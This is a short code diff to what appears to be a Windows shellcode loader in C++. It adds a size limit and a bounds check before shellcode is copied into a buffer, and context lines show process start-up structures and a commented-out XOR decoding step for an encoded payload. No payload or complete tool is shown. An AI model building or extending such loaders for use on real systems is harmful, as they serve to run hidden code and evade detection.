@@ -9,6 +9,8 @@
 
 #define DEBUGGING 1
 
+#define MAXSHELLCODESIZE 4096
+
 #define _CRT_SECURE_NO_DEPRECATE
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -128,6 +130,10 @@ int main()
 #ifdef DEBUGGING
 	printf("Shellcode size is %d\n", shellcode_size);
 #endif
+	if (shellcode_size > MAXSHELLCODESIZE) {
+		fprintf(stderr, "Shellcode is too big (%d), maximum size is %d\n", shellcode_size, MAXSHELLCODESIZE);
+		return 0;
+	}
 
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
@@ -168,7 +174,7 @@ int main()
 #endif
     }
 
-	unsigned char buf[4096];
+	unsigned char buf[MAXSHELLCODESIZE];
 	memcpy(buf, &shellcode[0], shellcode_size);
 
     // do_xor(encoded_kwdikas, sizeof(encoded_kwdikas), key, sizeof(key));
